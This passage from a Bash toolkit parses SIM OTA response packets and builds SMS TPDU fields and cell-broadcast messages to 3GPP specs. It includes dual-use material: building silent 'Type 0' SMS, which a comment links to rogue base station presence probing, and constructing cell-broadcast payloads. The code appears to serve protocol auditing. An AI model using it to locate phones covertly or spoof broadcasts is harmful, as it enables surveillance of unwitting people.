        printf 'ERROR\tPCNTR says %d padding octets, only %d follow the CC\n' \
            "$pad_octets" "$(( ${#data} / 2 ))" >&2
        return 1
    fi
    [[ "$cc_verdict" == "mismatch" ]] && return 1
    return 0
}

# --parse-resp-sms [<spi>] <hex>: the card's answer, TS 102 225 §5.2 in the
# SMS form of TS 31.115 §4.2. A Response Packet carries no SPI of its own: what
# protects it is octet 2 of the SPI in the command that asked for it, so the
# SPI is the first argument when it is known. It defaults to 0E00 -- PoR
# required, CC, unciphered -- and says so in spi_source.
#
# RPL, RHL, RPI and RHI are in the response, but the SMS form fills them in
# differently from CAT-TP: RHI is a null field, RPI is the UDH information
# element 0x71 whose value is '00', and the Response Packet sits after a
# three-octet UDH (02 71 00). RPL counts from the RHL octet to the end of the
# response data, RHL counts from the TAR to the end of the RC/CC/DS.
otasm_resp_status_meaning() {
    case "${1:-}" in
        00) printf 'PoR OK, the command was processed' ;;
        01) printf 'RC/CC/DS failed, the card rejected the integrity check' ;;
        02) printf 'CNTR low, the counter is below the value the card last received' ;;
        03) printf 'CNTR high, the counter is above the value the card last received' ;;
        04) printf 'CNTR blocked, the card refuses further command packets' ;;
        05) printf 'ciphering error, the card could not decipher the command' ;;
        06) printf 'unidentified security error, the header could not be read; the response is unciphered and carries no RC/CC/DS' ;;
        07) printf 'insufficient memory to process the incoming message' ;;
        08) printf 'more time, a later Response Packet will follow' ;;
        09) printf 'TAR unknown, no application behind that TAR' ;;
        0A) printf 'insufficient security level' ;;
        0B) printf 'reserved for 3GPP, the actual response arrives in an SMS-SUBMIT' ;;
        0C) printf 'reserved for 3GPP, the actual response arrives by USSD' ;;
        [CcDdEeFf]*) printf 'proprietary status code' ;;
        *) printf 'reserved or unknown status code' ;;
    esac
}

otasm_resp_sms_parse() {
    local spi_arg="" h transport="bare-packet" udh="027100" udh_source="assumed"
    if (( $# >= 2 )); then spi_arg="${1:-}"; h=$(otasm_norm_hex "${2:-}")
    else h=$(otasm_norm_hex "${1:-}"); fi
    if ! otasm_is_hex "$h"; then printf 'ERROR\tnot valid hex\n' >&2; return 2; fi
    h="${h^^}"
    if [[ "${h:0:6}" == "027000" ]]; then
        printf 'ERROR\tUDH carries RPI 0x70, the small Command Packet identifier; a Response Packet uses 0x71\n' >&2
        return 1
    fi
    if [[ "${h:0:6}" == "027100" ]]; then
        transport="sms-udh"; udh="${h:0:6}"; udh_source="present"; h="${h:6}"
    fi
    if (( ${#h} < 26 )); then
        printf 'ERROR\tresponse shorter than RPL+RHL+TAR+CNTR+PCNTR+status\n' >&2; return 1
    fi
    local rpl=$(( 16#${h:0:4} )) rhl=$(( 16#${h:4:2} )) tar="${h:6:6}"
    local after=$(( ${#h} / 2 - 2 ))
    if (( rpl != after )); then
        printf 'ERROR\tRPL says %d octets from the RHL octet to the end, the packet carries %d\n' \
            "$rpl" "$after" >&2
        return 1
    fi
    local sig_len=$(( rhl - 10 ))
    case "$sig_len" in
        0|4|8) ;;
        *) printf 'ERROR\tRHL is %d octets; TAR, CNTR, PCNTR and the status octet take 10, so the RC/CC/DS would be %d octets rather than 0, 4 or 8\n' \
               "$rhl" "$sig_len" >&2
           return 1 ;;
    esac
    local spi spi_source="argument"
    if [[ -n "$spi_arg" ]]; then
        spi=$(printf '%s' "$spi_arg" | tr 'a-f' 'A-F')
        [[ "$spi" =~ ^[0-9A-F]{4}$ ]] || {
            printf 'ERROR\tSPI must be 2 octets of hex\n' >&2; return 2; }
    else
        spi="0E00"; spi_source="default"
    fi
    local por_cipher por_rccds
    por_cipher=$(otasm_spi_field "$spi" por_cipher)
    por_rccds=$(otasm_spi_field "$spi" por_rccds)
    local body="${h:12}" cntr pcntr status cc data
    if (( por_cipher == 1 )); then
        if [[ -z "${OTASM_KIC_KEY:-}" ]]; then
            printf 'ERROR\tthe SPI says the response is ciphered and OTASM_KIC_KEY is not set\n' >&2
            return 2
        fi
        if (( ${#body} % 16 != 0 )); then
            printf 'ERROR\tthe ciphered part is %d octets, not whole 8-octet 3DES blocks\n' \
                "$(( ${#body} / 2 ))" >&2
            return 1
        fi
        local kic_key24; kic_key24=$(otasm_key24 "$OTASM_KIC_KEY") || return 2
        body=$(otasm_des3_cbc "$kic_key24" "$body" dec) || return 1
    fi
    body="${body^^}"   # xxd prints lower case; every hex field here is upper
    cntr="${body:0:10}"; pcntr="${body:10:2}"; status="${body:12:2}"
    if (( sig_len > 0 )); then
        cc="${body:14:$(( sig_len * 2 ))}"; data="${body:$(( 14 + sig_len * 2 ))}"
    else
        cc=""; data="${body:14}"
    fi
    local pad_octets=$(( 16#${pcntr} ))
    # The CC verdict first: a tampered packet fails the CC, and "the CC does
    # not verify" is the answer, not "the padding looks odd".
    local cc_verdict="not-present"
    if (( sig_len > 0 )); then
        if (( por_rccds == 2 && sig_len == 8 )); then
            if [[ -n "${OTASM_KID_KEY:-}" ]]; then
                local kid_key24 head signed recomputed
                kid_key24=$(otasm_key24 "$OTASM_KID_KEY") || return 2
                head="${h:0:12}"   # RPL || RHL || TAR
                signed="${udh}${head}${cntr}${pcntr}${status}${data}"
                recomputed=$(otasm_des3_cc "$kid_key24" "$signed") || return 1
                if [[ "${recomputed^^}" == "${cc^^}" ]]; then cc_verdict="verified"
                else cc_verdict="mismatch"; fi
            else
                cc_verdict="unknown-no-OTASM_KID_KEY"
            fi
        else
            cc_verdict="unverified-not-a-cc"
        fi
    fi
    local resp="$data" pad_ok=1
    if (( pad_octets > 0 )); then
        if (( ${#resp} / 2 < pad_octets )); then pad_ok=0
        else resp="${resp:0:$(( ${#resp} - pad_octets * 2 ))}"; fi
    fi
    printf 'dialect\tts31.115-sms-response\n'
    printf 'transport\t%s\nudh\t%s\nudh_source\t%s\n' "$transport" "$udh" "$udh_source"
    printf 'rpl\t%d\nrhl\t%d\ntar\t%s\n' "$rpl" "$rhl" "$tar"
    printf 'cntr\t%s\npcntr\t%s\n' "$cntr" "$pcntr"
    printf 'status\t%s\nstatus_meaning\t%s\n' "$status" "$(otasm_resp_status_meaning "$status")"
    printf 'spi\t%s\nspi_source\t%s\npor_cipher\t%s\npor_rccds\t%s\n' \
        "$spi" "$spi_source" "$por_cipher" "$por_rccds"
    printf 'sig_len\t%d\ncc\t%s\ncc_verdict\t%s\npadding_octets\t%d\n' \
        "$sig_len" "${cc:-none}" "$cc_verdict" "$pad_octets"
    printf 'additional_response_data\t%s\n' "${resp:-none}"
    local findings=0
    if (( pad_ok == 0 )); then
        printf 'ERROR\tPCNTR says %d padding octets, only %d follow the CC\n' \
            "$pad_octets" "$(( ${#data} / 2 ))" >&2
        findings=$(( findings + 1 ))
    fi
    # TS 102 226 §5.1.2: on por_ok the response data is a CompactRemoteResp --
    # number of commands, the last status word, the last response data.
    if [[ "$status" == "00" && -n "$resp" ]]; then
        local ncmd="${resp:0:2}" sw="${resp:2:4}" rdata="${resp:6}"
        printf 'response\t%s\nnumber_of_commands\t%d\nlast_status_word\t%s\nlast_response_data\t%s\n' \
            "compact" "$(( 16#$ncmd ))" "$sw" "${rdata:--}"
    elif [[ "$status" == "00" ]]; then
        printf 'note\tINFO\tstatus 00 with no response data: the card did its task and said nothing else\n'
    elif [[ -n "$resp" ]]; then
        printf 'finding\tMEDIUM\tstatus %s is not 00 but the response carries %d octets of response data, which table 3 says shall be empty for a standardized status code\n' \
            "$status" "$(( ${#resp} / 2 ))"
        findings=$(( findings + 1 ))
    fi
    if (( por_rccds == 0 && sig_len > 0 )); then
        printf 'finding\tMEDIUM\tthe command asked for no RC/CC/DS, so the response should carry none, yet RHL accounts for %d octets of it\n' "$sig_len"
        findings=$(( findings + 1 ))
    elif (( por_rccds != 0 && sig_len == 0 )); then
        printf 'finding\tHIGH\tthe command asked for an RC/CC/DS, so the response must carry one, but RHL accounts for none\n'
        findings=$(( findings + 1 ))
    fi
    if [[ "$spi_source" == "default" ]]; then
        printf 'note\tINFO\tSPI defaulted to 0E00 (PoR required, CC, unciphered); pass the SPI of the command that asked for this response\n'
    fi
    printf 'findings\t%d\n' "$findings"
    [[ "$cc_verdict" == "mismatch" ]] && return 1
    return 0
}

# ── counter / replay decision (TS 23.048 §8.2) ──────────────────────────
otasm_counter_check() {
    local counter="${1:-}" re="${2:-}" mode="${3:-0}"
    [[ "$counter" =~ ^[0-9]+$ && "$re" =~ ^[0-9]+$ && "$mode" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\tcounter, RE and mode must be numeric\n' >&2; return 2; }
    local verdict
    case "$mode" in
        0) verdict="process (counter absent — no replay protection)" ;;
        1) verdict="process (counter informational only)" ;;
        2) (( counter > re )) && verdict="process (counter above the received value)" || verdict="REPLAY (counter not above RE)" ;;
        3) (( counter == re + 1 )) && verdict="process (counter is exactly RE+1)" || verdict="REPLAY (counter is not RE+1)" ;;
        *) printf 'ERROR\tcounter mode must be 0..3\n' >&2; return 2 ;;
    esac
    printf 'mode\t%d\ncounter\t%d\nre\t%d\nverdict\t%s\n' "$mode" "$counter" "$re" "$verdict"
}

# ════════════════════════════════════════════════════════════════════════
# TS 23.040 TP layer (SM-TL) — the short message an OTA packet rides in.
#
# The half above builds the TS 23.048 command packet *inside* a SM; this half
# is the SM itself: TP-MTI / TP-PID / TP-DCS / TP-UD, and the report types.
# It is here because TS 23.040 §9.2.3.9 defines "Short Message Type 0"
# (TP-PID = 0x40): the ME must acknowledge it, must not indicate it to the
# user and must not store it, whatever the memory state. That is the presence
# trigger every rogue-BTS module needs, so it is built and audited here.
#
# Building a TPDU is not transmitting one. Nothing below opens a socket,
# a serial port or a modem, and --send / --deliver stay rejected.
# ════════════════════════════════════════════════════════════════════════

# ── TS 23.038 §6.2.1 GSM 7-bit default alphabet ─────────────────────────
# Prints the septet code, or "E <code>" for a character reachable only
# through the §6.2.1.1 extension table (ESC 27 then the extension code).
# A character outside the alphabet is a hard error, never a silent
# substitution — the same rule 38_ussd applies.
otasm_tp_g7_code() {
    local ch="${1:-}"
    [[ -n "$ch" ]] || { printf 'ERROR\tempty character\n' >&2; return 2; }
    case "$ch" in
        '@') printf '0';   return 0 ;;
        '$') printf '2';   return 0 ;;
        '_') printf '17';  return 0 ;;
        '£') printf '1';   return 0 ;;
        '¥') printf '3';   return 0 ;;
        'è') printf '4';   return 0 ;;
        'é') printf '5';   return 0 ;;
        'ù') printf '6';   return 0 ;;
        'ì') printf '7';   return 0 ;;
        'ò') printf '8';   return 0 ;;
        'Ç') printf '9';   return 0 ;;
        'Ø') printf '11';  return 0 ;;
        'ø') printf '12';  return 0 ;;
        'Å') printf '14';  return 0 ;;
        'å') printf '15';  return 0 ;;
        'Δ') printf '16';  return 0 ;;
        'Φ') printf '18';  return 0 ;;
        'Γ') printf '19';  return 0 ;;
        'Λ') printf '20';  return 0 ;;
        'Ω') printf '21';  return 0 ;;
        'Π') printf '22';  return 0 ;;
        'Ψ') printf '23';  return 0 ;;
        'Σ') printf '24';  return 0 ;;
        'Θ') printf '25';  return 0 ;;
        'Ξ') printf '26';  return 0 ;;
        'Æ') printf '28';  return 0 ;;
        'æ') printf '29';  return 0 ;;
        'ß') printf '30';  return 0 ;;
        'É') printf '31';  return 0 ;;
        '¤') printf '36';  return 0 ;;
        '¡') printf '64';  return 0 ;;
        'Ä') printf '91';  return 0 ;;
        'Ö') printf '92';  return 0 ;;
        'Ñ') printf '93';  return 0 ;;
        'Ü') printf '94';  return 0 ;;
        '§') printf '95';  return 0 ;;
        '¿') printf '96';  return 0 ;;
        'ä') printf '123'; return 0 ;;
        'ö') printf '124'; return 0 ;;
        'ñ') printf '125'; return 0 ;;
        'ü') printf '126'; return 0 ;;
        'à') printf '127'; return 0 ;;
        # §6.2.1.1 extension table — ESC (27) then the extension code.
        $'\f') printf 'E 10'; return 0 ;;
        '[')  printf 'E 60';  return 0 ;;
        '\') printf 'E 47';  return 0 ;;
        ']')  printf 'E 62';  return 0 ;;
        '^')  printf 'E 20';  return 0 ;;
        '{')  printf 'E 40';  return 0 ;;
        '|')  printf 'E 64';  return 0 ;;
        '}')  printf 'E 41';  return 0 ;;
        '~')  printf 'E 61';  return 0 ;;
        '€')  printf 'E 101'; return 0 ;;
        $'\n') printf '10'; return 0 ;;
        $'\r') printf '13'; return 0 ;;
    esac
    # The main table is the identity for printable ASCII apart from the three
    # exceptions above. Everything else — including '`' and the non-Latin-1
    # characters the table leaves out — is an error.
    local c
    c=$(printf '%d' "'$ch" 2>/dev/null) || c=0
    if (( c >= 32 && c <= 126 )); then printf '%d' "$c"; return 0; fi
    printf 'ERROR\tcharacter not in the GSM 7-bit default alphabet: %s\n' "$ch" >&2
    return 2
}
# Main table only (septet -> character); 27 is the ESC, handled by the caller.
otasm_tp_g7_char() {
    local s="${1:-0}"
    [[ "$s" =~ ^[0-9]+$ ]] || { printf 'ERROR\tseptet must be numeric\n' >&2; return 2; }
    (( s >= 0 && s <= 127 )) || { printf 'ERROR\tseptet out of range: %s\n' "$s" >&2; return 2; }
    case "$s" in
        0) printf '@' ;; 1) printf '£' ;; 2) printf '$' ;; 3) printf '¥' ;;
        4) printf 'è' ;; 5) printf 'é' ;; 6) printf 'ù' ;; 7) printf 'ì' ;;
        8) printf 'ò' ;; 9) printf 'Ç' ;; 10) printf '\n' ;; 11) printf 'Ø' ;;
        12) printf 'ø' ;; 13) printf '\r' ;; 14) printf 'Å' ;; 15) printf 'å' ;;
        16) printf 'Δ' ;; 17) printf '_' ;; 18) printf 'Φ' ;; 19) printf 'Γ' ;;
        20) printf 'Λ' ;; 21) printf 'Ω' ;; 22) printf 'Π' ;; 23) printf 'Ψ' ;;
        24) printf 'Σ' ;; 25) printf 'Θ' ;; 26) printf 'Ξ' ;; 27) printf '\033' ;;
        28) printf 'Æ' ;; 29) printf 'æ' ;; 30) printf 'ß' ;; 31) printf 'É' ;;
        36) printf '¤' ;; 64) printf '¡' ;;
        91) printf 'Ä' ;; 92) printf 'Ö' ;; 93) printf 'Ñ' ;; 94) printf 'Ü' ;; 95) printf '§' ;;
        96) printf '¿' ;;
        123) printf 'ä' ;; 124) printf 'ö' ;; 125) printf 'ñ' ;; 126) printf 'ü' ;;
        127) printf 'à' ;;
        *) printf "\\$(printf '%03o' "$s")" ;;
    esac
}
# Extension table only (extension code -> character), TS 23.038 §6.2.1.1.
otasm_tp_g7_ext_char() {
    case "${1:-}" in
        10) printf '\f' ;;
        20) printf '^' ;;
        40) printf '{' ;;
        41) printf '}' ;;
        47) printf '\\' ;;
        60) printf '[' ;;
        61) printf '~' ;;
        62) printf ']' ;;
        64) printf '|' ;;
        101) printf '€' ;;
        *) printf 'ERROR\tno GSM 7-bit extension character for code %s\n' "${1:-}" >&2; return 2 ;;
    esac
}
# Text -> space-separated septet codes (an extension character emits "27 <code>").
otasm_tp_septets() {
    local text="${1:-}" out=() i ch enc
    [[ -n "$text" ]] || { printf 'ERROR\tempty text\n' >&2; return 2; }
    for (( i = 0; i < ${#text}; i++ )); do
        ch="${text:i:1}"
        enc=$(otasm_tp_g7_code "$ch") || return 2
        if [[ "$enc" == E\ * ]]; then out+=( 27 "${enc#E }"); else out+=( "$enc" ); fi
    done
    printf '%s' "${out[*]}"
}
# Space-separated septet codes -> text.
otasm_tp_text() {
    local codes="${1:-}" s out="" esc=0
    set -- $codes
    (( $# > 0 )) || { printf 'ERROR\tno septets\n' >&2; return 2; }
    for s in "$@"; do
        if (( esc == 1 )); then
            out+=$(otasm_tp_g7_ext_char "$s") || return 2
            esc=0
        elif (( s == 27 )); then
            esc=1
        else
            out+=$(otasm_tp_g7_char "$s") || return 2
        fi
    done
    (( esc == 0 )) || { printf 'ERROR\tdangling ESC (27) at the end of the septets\n' >&2; return 2; }
    printf '%s' "$out"
}

# ── TS 23.041 CELL BROADCAST ───────────────────────────────────────────
# A CB message is not sent like an SMS. It is assembled once, split into
# blocks, and those blocks are carried four at a time on the CBCH in a
# 51-multiframe (TS 44.012 §6.1). The CBC-facing half is the command that
# carries the same message to the BSC; its field layout is the 48.049
# WRITE-REPLACE reading, and what is not citable is said so.
#
# Serial Number (TS 23.041 §9.3.2): 2 bits geographic scope, 10 bits message
# code, 4 bits update number.
otasm_cb_serial() {   # <geo-scope 0..3> <message-code 0..1023> <update 0..15>
    local gs="${1:-0}" code="${2:-0}" up="${3:-0}"
    [[ "$gs" =~ ^[0-3]$ ]] || { printf 'ERROR\tgeographic scope must be 0..3\n' >&2; return 2; }
    [[ "$code" =~ ^[0-9]+$ ]] && (( code <= 1023 )) || { printf 'ERROR\tmessage code must be 0..1023\n' >&2; return 2; }
    [[ "$up" =~ ^[0-9]+$ ]] && (( up <= 15 )) || { printf 'ERROR\tupdate number must be 0..15\n' >&2; return 2; }
    printf '%04x\n' "$(( (gs << 14) | (code << 4) | up ))"
}

# CB message (TS 23.041 §9.4.1): Message Identifier (2), Serial Number (2),
# DCS (1), then the CB data. A 7-bit message is capped at 82 octets of data.
otasm_cb_build() {   # <text> [--message-id HEX4] [--serial HEX4] [--dcs HEX2] [--gs N] [--code N] [--update N]
    local text="${1:-}" mid="1234" serial="" dcs="00" gs=0 code=0 up=0
    shift 1 || true
    while (( $# )); do
        case "$1" in
            --message-id) mid=$(otasm_norm_hex "${2:-}"); shift 2 ;;
            --serial)     serial=$(otasm_norm_hex "${2:-}"); shift 2 ;;
            --dcs)        dcs=$(otasm_norm_hex "${2:-}"); shift 2 ;;
            --gs)         gs="${2:-0}"; shift 2 ;;
            --code)       code="${2:-0}"; shift 2 ;;
            --update)     up="${2:-0}"; shift 2 ;;
            *) printf 'ERROR\tunknown option %s\n' "$(otasm_sanitize "$1")" >&2; return 2 ;;
        esac
    done
    [[ "$mid" =~ ^[0-9a-f]{4}$ ]] || { printf 'ERROR\t--message-id must be 4 hex digits\n' >&2; return 2; }
    [[ "$dcs" =~ ^[0-9a-f]{2}$ ]] || { printf 'ERROR\t--dcs must be 2 hex digits\n' >&2; return 2; }
    if [[ -z "$serial" ]]; then
        serial=$(otasm_cb_serial "$gs" "$code" "$up") || return 1
    fi
    [[ "$serial" =~ ^[0-9a-f]{4}$ ]] || { printf 'ERROR\t--serial must be 4 hex digits\n' >&2; return 2; }
    [[ -n "$text" ]] || { printf 'ERROR\tusage: --cb-build <text> [--message-id HEX4]\n' >&2; return 2; }
    local data
    if [[ "$dcs" == "00" ]]; then
        data=$(otasm_tp_pack_text "$text") || return 1
        local octets=$(( ${#data} / 2 ))
        (( octets <= 82 )) || { printf 'ERROR\t7-bit CB data is %s octets, above the 82-octet limit\n' "$octets" >&2; return 2; }
        printf 'dsc\t7-bit default alphabet\n'
    else
        data=$(otasm_norm_hex "$text")
        otasm_is_hex "$data" || { printf 'ERROR\twith DCS %s the data must be hex (8-bit)\n' "$dcs" >&2; return 2; }
        (( ${#data} / 2 <= 82 )) || { printf 'ERROR\tCB data above 82 octets\n' >&2; return 2; }
        printf 'dsc\t8-bit data\n'
    fi
    local msg="${mid}${serial}${dcs}${data}"
    printf 'message_id\t%s\n' "$mid"
    printf 'serial\t%s\n' "$serial"
    printf 'dcs\t%s\n' "$dcs"
    printf 'data_octets\t%d\n' "$(( ${#data} / 2 ))"
    printf 'cb_message\t%s\n' "$msg"
    printf 'note\tfield order (message id, serial, dcs) follows the TS 23.041 9.4.1 CB message heading\n'
}

# The CB message split over CBCH blocks (TS 44.012 §6.1): each block is a
# length octet then at most 22 data octets, and the tail pads with 0x2b.
# Four blocks ride the four CBCH positions of one 51-multiframe.
otasm_cb_blocks() {   # <cb-message-hex>
    local msg; msg=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$msg" || { printf 'ERROR\tCB message must be hex\n' >&2; return 2; }
    local total=$(( ${#msg} / 2 )) n=0 blk off=0 part len i=0
    local oc=()
    while (( off < total )); do
        n=$(( total - off )); (( n > 22 )) && n=22
        part="${msg:$(( off * 2 )):$(( n * 2 ))}"
        blk=$(printf '02%02x%s' "$(( n + 1 ))" "$part")
        oc+=( "$blk" )
        off=$(( off + n ))
    done
    local count padded j
    count=${#oc[@]}
    padded=$(( (count + 3) / 4 * 4 ))
    for (( j = count; j < padded; j++ )); do oc+=( "012b" ); done
    for (( j = 0; j < padded; j++ )); do
        printf 'block\t%d\t%s\n' "$j" "$(printf '%s' "${oc[j]}" | awk '{s=""; for(k=1;k<=length($0);k+=2) s=s substr($0,k,2) " "; print s}')"
    done
    printf 'blocks\t%d\n' "$padded"
    printf 'multiframes\t%d\n' "$(( padded / 4 ))"
    printf 'note\tfill octet is 0x2b; four blocks per CBCH multiframe (TS 44.012 6.1)\n'
}

# CBC-facing command: the WRITE-REPLACE shape that carries the same message
# from the CBC to the BSC (TS 48.049). The fields below follow the §6.2
# message contents; where the octet coding is a reading rather than quoted
# text the row says reading.
otasm_cb_command() {   # <cb-message-hex> <message-id-hex4>
    local msg; msg=$(otasm_norm_hex "${1:-}"); local mid=$(otasm_norm_hex "${2:-}")
    otasm_is_hex "$msg" || { printf 'ERROR\tCB message must be hex\n' >&2; return 2; }
    [[ "$mid" =~ ^[0-9a-f]{4}$ ]] || { printf 'ERROR\tmessage id must be 4 hex digits\n' >&2; return 2; }
    [[ "$msg" =~ ^$mid ]] || { printf 'ERROR\tthe CB message does not start with message id %s\n' "$mid" >&2; return 2; }
    local serial="${msg:4:4}" dcs="${msg:8:2}" data="${msg:10}"
    # Message type 0x01 WRITE-REPLACE, then the information elements.
    local cmd
    cmd="01"
    cmd+="01$(printf '%02x' "$(( (${#serial} / 2) + (${#dcs} / 2) + (${#data} / 2) ))" )"   # CB data IE
    cmd+="$serial$dcs$data"
    printf 'message_type\t01\twrite-replace (TS 48.049 6.2)\n'
    printf 'serial\t%s\n' "$serial"
    printf 'dcs\t%s\n' "$dcs"
    printf 'data_octets\t%d\n' "$(( ${#data} / 2 ))"
    printf 'cb_command\t%s\n' "$cmd"
    printf 'note\tWRITE-REPLACE carries the whole CB message in one CB data IE; the octet coding is a reading of TS 48.049 6.2, not quoted text\n'
}

# ── TS 23.038 §6.1.2.1.1 seven-bit packing ──────────────────────────────
# "The bit number zero is always transmitted first."  Codes are packed
# low-bit-first, so septet i starts at bit 7*i of the octet string.
otasm_tp_pack() {
    local codes="${1:-}" s i=0 byte shift
    local out=()
    set -- $codes
    (( $# > 0 )) || { printf 'ERROR\tno septets to pack\n' >&2; return 2; }
    local nbytes=$(( ($# * 7 + 7) / 8 ))
    for (( byte = 0; byte < nbytes; byte++ )); do out[byte]=0; done
    for s in "$@"; do
        [[ "$s" =~ ^[0-9]+$ ]] && (( s >= 0 && s <= 127 )) || {
            printf 'ERROR\tseptet out of range: %s\n' "$s" >&2; return 2; }
        byte=$(( i * 7 / 8 )); shift=$(( i * 7 % 8 ))
        out[byte]=$(( out[byte] | ((s << shift) & 0xFF) ))
        (( shift > 1 )) && out[byte+1]=$(( out[byte+1] | (s >> (8 - shift)) ))
        i=$(( i + 1 ))
    done
    printf '%02x' "${out[@]}"
}
# hex + septet count -> space-separated codes.  The count is the TP-UDL: taking
# it explicitly is what stops a padded payload decoding trailing fill bits as
# '@' characters (the bug recorded in docs/FEATURE-GAPS.md for 38_ussd).
otasm_tp_unpack() {
    local h; h=$(otasm_norm_hex "${1:-}")
    local count="${2:-0}"
    otasm_is_hex "$h" || { printf 'ERROR\tnot even-length hex\n' >&2; return 2; }
    [[ "$count" =~ ^[0-9]+$ ]] || { printf 'ERROR\tseptet count must be numeric\n' >&2; return 2; }
    local nbytes=$(( ${#h} / 2 ))
    local b=() i byte shift val
    for (( i = 0; i < nbytes; i++ )); do b[i]=$(( 16#${h:$((i*2)):2} )); done
    local nseptets=$(( nbytes * 8 / 7 ))
    (( count > 0 && count < nseptets )) && nseptets=$count
    local out=()
    for (( i = 0; i < nseptets; i++ )); do
        byte=$(( i * 7 / 8 )); shift=$(( i * 7 % 8 ))
        val=$(( b[byte] >> shift ))
        (( shift > 1 )) && val=$(( val | (b[byte+1] << (8 - shift)) ))
        out+=( "$(( val & 0x7F ))" )
    done
    printf '%s' "${out[*]}"
}
# Text -> packed hex, and packed hex + septet count -> text.
otasm_tp_pack_text() {
    local codes; codes=$(otasm_tp_septets "${1:-}") || return 2
    otasm_tp_pack "$codes"
}
otasm_tp_unpack_text() {
    local codes; codes=$(otasm_tp_unpack "${1:-}" "${2:-0}") || return 2
    otasm_tp_text "$codes"
}

# ── TS 23.040 §9.2.3.11 TP-SCTS ─────────────────────────────────────────
# Seven semi-octet-swapped octets: YY MM DD hh mm ss TZ.  Within an octet the
# low half-octet holds the most significant digit (§9.1.2.3).  The time zone
# is a signed number of quarter hours; its sign is bit 3 of the seventh octet
# and the tens digit is therefore limited to 0..7 (§9.2.3.11).
otasm_tp_scts_build() {
    local d="${1:-}" tz="${2:-0}" out="" i
    [[ "$d" =~ ^[0-9]{12}$ ]] || {
        printf 'ERROR\tSCTS must be 12 decimal digits (YYMMDDhhmmss)\n' >&2; return 2; }
    [[ "$tz" =~ ^-?[0-9]{1,2}$ ]] || {
        printf 'ERROR\ttime zone must be signed quarter hours (-79..79)\n' >&2; return 2; }
    for (( i = 0; i < 12; i += 2 )); do out+="${d:$((i+1)):1}${d:$i:1}"; done
    local a=${tz#-} sign=0
    (( tz < 0 )) && sign=1
    local tzd b
    printf -v tzd '%02d' "$a"
    b=$(( (16#${tzd:1:1} << 4) | 16#${tzd:0:1} ))
    (( sign == 1 )) && b=$(( b | 0x08 ))
    printf '%s%02x\n' "$out" "$b"
}
otasm_tp_scts_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} == 14 )) || {
        printf 'ERROR\tTP-SCTS must be 7 octets\n' >&2; return 2; }
    local sw="" i
    for (( i = 0; i < 12; i += 2 )); do sw+="${h:$((i+1)):1}${h:$i:1}"; done
    local tzb=$(( 16#${h:12:2} ))
    local neg=$(( (tzb >> 3) & 1 ))
    local units=$(( (tzb >> 4) & 0x0F )) tens=$(( tzb & 0x07 ))
    local q=$(( tens * 10 + units ))
    local signed=$q; (( neg == 1 )) && signed=$(( -q ))
    printf 'scts\t%s\n' "$h"
    printf 'scts_year\t20%s\nscts_month\t%s\nscts_day\t%s\n' "${sw:0:2}" "${sw:2:2}" "${sw:4:2}"
    printf 'scts_hour\t%s\nscts_minute\t%s\nscts_second\t%s\n' "${sw:6:2}" "${sw:8:2}" "${sw:10:2}"
    printf 'scts_tz_quarters\t%d\n' "$signed"
    printf 'scts_tz\tUTC%+d:%02d\n' "$(( signed / 4 ))" "$(( (signed % 4) * 15 ))"
    printf 'scts_local\t20%s-%s-%sT%s:%s:%s\n' \
        "${sw:0:2}" "${sw:2:2}" "${sw:4:2}" "${sw:6:2}" "${sw:8:2}" "${sw:10:2}"
    return 0
}

# ── TS 23.040 §9.1.2.5 address field ────────────────────────────────────
# [Address-Length][Type-of-Address][Address-Value].  The length counts useful
# semi-octets only, so an odd digit count carries an 'F' fill semi-octet.
otasm_tp_addr_build() {
    local ton="${1:-0}" npi="${2:-0}" digits="${3:-}"
    [[ "$ton" =~ ^[0-7]$ ]] || { printf 'ERROR\ttype-of-number must be 0..7\n' >&2; return 2; }
    [[ "$npi" =~ ^[0-9]$ ]] || { printf 'ERROR\tnumbering plan must be 0..9\n' >&2; return 2; }
    (( ton != 5 )) || {
        printf 'ERROR\talphanumeric (type-of-number 5) originators are readable but not built here\n' >&2; return 2; }
    digits=$(printf '%s' "$digits" | tr -d ' ()-')
    [[ "$digits" =~ ^[0-9]*$ ]] || { printf 'ERROR\taddress digits must be decimal\n' >&2; return 2; }
    local n=${#digits}
    (( n >= 1 && n <= 20 )) || { printf 'ERROR\taddress must be 1..20 digits\n' >&2; return 2; }
    local val="" i a b
    for (( i = 0; i < n; i += 2 )); do
        a="${digits:i:1}"; b="${digits:$((i+1)):1}"
        [[ -n "$b" ]] || b=f
        val+="${b}${a}"
    done
    printf '%02x%02x%s\n' "$n" "$(( 0x80 | (ton << 4) | npi ))" "$val"
}
otasm_tp_addr_parse() {
    local h; h=$(otasm_norm_hex "${1:-}")
    otasm_is_hex "$h" && (( ${#h} >= 2 )) || { printf 'ERROR\taddress field must be hex\n' >&2; return 2; }
    local alen=$(( 16#${h:0:2} ))
    local voctets=$(( (alen + 1) / 2 ))
    (( ${#h} >= (1 + 1 + voctets) * 2 )) || {
        printf 'ERROR\taddress field shorter than its Address-Length (%d semi-octets)\n' "$alen" >&2; return 1; }
    local toa=$(( 16#${h:2:2} ))
    local val="${h:4:$((voctets*2))}"
    local ton=$(( (toa >> 4) & 0x07 )) npi=$(( toa & 0x0F ))
    local ton_t
    case "$ton" in
        0) ton_t="unknown" ;; 1) ton_t="international" ;; 2) ton_t="national" ;;
        3) ton_t="network specific" ;; 4) ton_t="subscriber" ;;
        5) ton_t="alphanumeric" ;; 6) ton_t="abbreviated" ;; 7) ton_t="reserved (interpret as unknown)" ;;
    esac
    local npi_t
    case "$npi" in
        0) npi_t="unknown" ;; 1) npi_t="ISDN/E.164" ;; 3) npi_t="data/X.121" ;; 4) npi_t="telex" ;;
        5|6) npi_t="service-centre specific" ;; 8) npi_t="national" ;; 9) npi_t="private" ;;
        10) npi_t="ERMES" ;; 15) npi_t="reserved for extension" ;; *) npi_t="reserved (interpret as unknown)" ;;
    esac
    printf 'addr\t%s\naddr_octets\t%d\naddr_length\t%d\ntoa\t%02x\ntoa_ton\t%d\ntoa_ton_meaning\t%s\ntoa_npi\t%d\ntoa_npi_meaning\t%s\n' \
        "$h" $(( 2 + voctets )) "$alen" "$toa" "$ton" "$ton_t" "$npi" "$npi_t"
    local digits="" i
    for (( i = 0; i < voctets; i++ )); do
        local lo="${val:$((i*2+1)):1}" hi="${val:$((i*2)):1}"
        if (( alen % 2 == 1 )) && (( i == voctets - 1 )); then
            digits+="$lo"
        else
            digits+="$lo$hi"
        fi
    done
